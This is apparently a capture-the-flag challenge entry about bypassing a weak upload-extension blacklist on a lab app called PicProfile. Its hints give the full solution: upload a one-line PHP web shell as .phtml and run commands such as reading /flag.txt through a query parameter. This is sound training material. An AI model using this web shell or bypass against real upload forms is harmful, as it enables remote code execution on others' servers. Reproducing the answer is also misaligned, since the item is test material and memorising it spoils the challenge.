title: Upload to RCE — Weak Extension Blacklist
description: PicProfile blocks .php uploads but Apache treats other extensions as PHP too. Upload a shell, execute it, read /flag.txt.

hints.text: Blacklist rejects .php / .php5 / .php7 / .pht. The Apache config in this container handles two other extensions as PHP.
Try .phtml or .phar. Upload `<?php system($_GET['c']); ?>` as shell.phtml, then hit /uploads/shell.phtml?c=cat%20/flag.txt.
